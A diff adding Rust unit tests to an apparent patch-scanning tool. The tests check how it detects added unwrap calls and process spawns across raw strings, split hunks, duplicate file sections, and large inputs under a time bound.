+                text(&[0, 2]),
+                text(&[1, 2])
+            ]
+        );
+        // a hunk that removes lines and has no new line says the new line it stands after
+        let removed = existing("@@ -3,2 +3,3 @@\n l3\n+a\n l4\n@@ -9,1 +5,0 @@\n-gone\n");
+        assert_eq!(texts(&removed), [text(&[0]), text(&[1]), text(&[0, 1])]);
+    }
+
+    /// A side that began inside a raw string opened with several `#` is read to the quote
+    /// that truly ends it, whatever quotes its text holds (seventh independent review,
+    /// IR7-M-1: the review's `html.patch`, the plain output of `git diff` for a test whose
+    /// page is a raw string opened with `r##"`; the first quote with a `#` after it is in
+    /// `href="#top"`, round 13 and round 14 ended the string there and lost both panic
+    /// paths, and release 0.8.3 never had that signal). The quote that ends the string has
+    /// more `#` after it than any quote before it, and the side is read for each such
+    /// record.
+    #[test]
+    fn a_raw_string_ends_at_a_quote_that_sets_a_record_of_hashes() {
+        assert_eq!(
+            quote_hash_records(&["plain", "a \"quote\" and # apart"]),
+            []
+        );
+        assert_eq!(quote_hash_records(&["<a href=\"#top\">", "\"##;"]), [1, 2]);
+        assert_eq!(quote_hash_records(&["\"## \"# \"###", "\"####"]), [2, 3, 4]);
+        // no more than the bound, lowest first
+        assert_eq!(
+            quote_hash_records(&["\"# \"## \"### \"#### \"##### \"######"]),
+            [1, 2, 3, 4]
+        );
+        let html = "diff --git a/tests/page.rs b/tests/page.rs\n--- a/tests/page.rs\n+++ b/tests/page.rs\n@@ -11,6 +11,7 @@ fn links_are_counted() {\n <a href=\"#top\">Top</a>\n <a href=\"https://example.com/docs\">Docs</a>\n \"##;\n-    let n = parse(html);\n-    assert!(n.is_ok());\n+    let n = parse(html).unwrap();\n+    let out = std::process::Command::new(\"true\").status().unwrap();\n+    assert!(n > 0 && out.success());\n }\n";
+        assert_eq!(
+            found_in(html),
+            [
+                (S::PanicPathAdded, Basis::Lexical, 14),
+                (S::ProcessSpawn, Basis::Lexical, 15),
+                (S::PanicPathAdded, Basis::Lexical, 15),
+            ]
+        );
+        // The bound. A page in a raw string whose text holds quotes with one, two and three
+        // `#`, and a link, ended by a quote with four: the fourth record, and the call after
+        // it is found. One more level (quotes with up to four `#` in the text, ended by five)
+        // is past the readings: the declared miss. (No other reading has that call: read
+        // from code or from inside an ordinary string, the link's `//` and the last quote
+        // leave the added line inside a string.)
+        let page = |inner: &str, end: &str| {
+            format!(
+                "--- a/tests/deep.rs\n+++ b/tests/deep.rs\n@@ -20,4 +20,5 @@\n <a href=\"#a\"> \"## \"###{inner}\n <a href=\"https://example.com/docs\">Docs</a>\n \"{end};\n+    let n = load().unwrap();\n }}\n"
+            )
+        };
+        assert_eq!(
+            found_in(&page("", "####")),
+            [(S::PanicPathAdded, Basis::Lexical, 23)]
+        );
+        assert_eq!(found_in(&page(" \"####", "#####")), []);
+    }
+
+    /// A construct cut in two by hunks that nothing joins is read at the edges of its halves
+    /// (seventh independent review, the declared limit `cutpair.patch`: two hunks that touch
+    /// while the second's position says they do not; plain `git apply --check -v`: rc 0 and
+    /// no offset line; rustc compiles the result). With both numbers of the second hunk
+    /// false, no join reads the two together, and round 14 was silent. The first half ends
+    /// on `.unwrap`, which no line of code ends on, and that is the item.
+    #[test]
+    fn a_construct_cut_by_hunks_that_nothing_joins_is_read_at_the_edge() {
+        let existing = |hunks: &str| {
+            parse(&format!("--- a/cut.rs\n+++ b/cut.rs\n{hunks}"))
+                .unwrap()
+                .remove(0)
+        };
+        let first =
+            "@@ -1,2 +1,3 @@\n fn f(opt: Option<u32>) -> u32 {\n+    let v = opt.unwrap\n \n";
+        for second in ["@@ -40,2 +50,3 @@", "@@ -3,2 +4,3 @@", "@@ -40,2 +4,3 @@"] {
+            let file = existing(&format!("{first}{second}\n+    ();\n     a\n }}\n"));
+            assert_eq!(
+                found(&file),
+                [(S::PanicPathAdded, Basis::Hunk, 2)],
+                "{second}"
+            );
+        }
+        // the cut before the word: the second half begins with it
+        let before = existing(
+            "@@ -1,2 +1,3 @@\n fn f(opt: Option<u32>) -> u32 {\n+    let v = opt.\n \n@@ -40,2 +50,3 @@\n+    unwrap();\n     a\n }\n",
+        );
+        assert_eq!(found(&before), [(S::PanicPathAdded, Basis::Hunk, 50)]);
+        // hunks in the other order, and a spawn cut after its `::`
+        let spawn = existing(
+            "@@ -40,2 +50,3 @@\n+    new(\"sh\").status().ok();\n     a\n }\n@@ -1,2 +1,3 @@\n fn f() {\n+    std::process::Command::\n \n",
+        );
+        // (`process::Command` is whole on its line; the path that goes on after `::` is the
+        // edge's, and the higher basis is the item's)
+        assert_eq!(found(&spawn), [(S::ProcessSpawn, Basis::Hunk, 2)]);
+        // The beginning of a side is an edge only in its reading from code. Read from inside
+        // a comment, this side's first token after `*/` is `unwrap`; it is not the first of
+        // the side, and a call of a function of that name is no panic path.
+        let inside =
+            existing("@@ -30,2 +30,3 @@\n the end of a note */ unwrap(x);\n+f();\n g();\n");
+        assert_eq!(found(&inside), []);
+    }
+
+    /// A second section for the same path (seventh independent review, IR7-H-2). Plain
+    /// `git apply` 2.56.0 applies both sections to the one file ("Checking patch src/n.rs..."
+    /// twice, rc 0), the result is the call `opt.unwrap\n();` and rustc compiles it. To this
+    /// crate a section is a file: nothing joins the two.
+    ///
+    /// THIS TEST PINS TODAY'S ANSWER AND MUST CHANGE WITH THE REBASE. Release 0.8.4 (not
+    /// merged where this branch stands) makes the parser refuse a patch that names a path in
+    /// more than one section, and this branch must not be merged before it stands on that
+    /// refusal. After the rebase `parse` must return an error for this patch: replace the
+    /// body of this test by that assertion.
+    ///
+    /// Until then: the first section ends on `.unwrap`, and the edge of a side is read, so
+    /// the call is reported there (round 14: nothing). The second section says nothing.
+    /// (A rename of a file the patch creates, followed by a change to the new name, is not
+    /// another way to this: plain Git refuses it, "src/n.rs: No such file or directory".)
+    #[test]
+    fn a_second_section_for_one_path_is_two_files_until_the_parser_refuses_it() {
+        let files = parse(
+            "diff --git a/src/n.rs b/src/n.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/n.rs\n@@ -0,0 +1,2 @@\n+pub fn f(opt: Option<u32>) -> u32 {\n+    let v = opt.unwrap\ndiff --git a/src/n.rs b/src/n.rs\n--- a/src/n.rs\n+++ b/src/n.rs\n@@ -9,0 +3,3 @@\n+    ();\n+    v\n+}\n",
+        )
+        .unwrap();
+        assert_eq!(files.len(), 2);
+        assert_eq!(
+            (files[0].path.as_str(), files[1].path.as_str()),
+            ("src/n.rs", "src/n.rs")
+        );
+        assert_eq!(found(&files[0]), [(S::PanicPathAdded, Basis::Hunk, 2)]);
+        assert_eq!(found(&files[1]), []);
+    }
+
+    /// The texts of a file are found in a time that goes with the number of its hunks. A
+    /// patch that is all pairs of touching hunks has a run for each pair, and each run that a
+    /// number makes is looked for among the runs already made: with a search of all of them
+    /// (as this round first had it) 165,000 pairs did not finish in two minutes, where the
+    /// round before took three seconds. A run is looked for among the runs that begin with
+    /// its first hunk, five at most.
+    #[test]
+    fn the_texts_of_a_file_of_pairs_cost_what_it_is_long() {
+        const PAIRS: usize = 60_000;
+        let spent = within_deadline(|| {
+            let mut patch = String::from("--- a/src/big.rs\n+++ b/src/big.rs\n");
+            for pair in 0..PAIRS {
+                let (old, new) = (10 + 20 * pair, 10 + 22 * pair);
+                let _ = write!(
+                    patch,
+                    "@@ -{old},1 +{new},2 @@\n ctx\n+a();\n@@ -{},1 +{},2 @@\n ctx\n+b();\n",
+                    old + 1,
+                    new + 2
+                );
+            }
+            let file = parse(&patch).unwrap().remove(0);
+            let start = ScanClock::start();
+            let texts = texts(&file);
+            let spent = start.elapsed();
+            // every hunk alone, and one run for each pair
+            assert_eq!(texts.len(), 3 * PAIRS);
+            assert_eq!(texts[2 * PAIRS].hunks, [0, 1]);
+            spent
+        });
+        // A debug build takes a few tenths of a second; the search of every run took minutes.
+        assert!(spent < COST_BOUND, "{spent:?}");
     }
 }
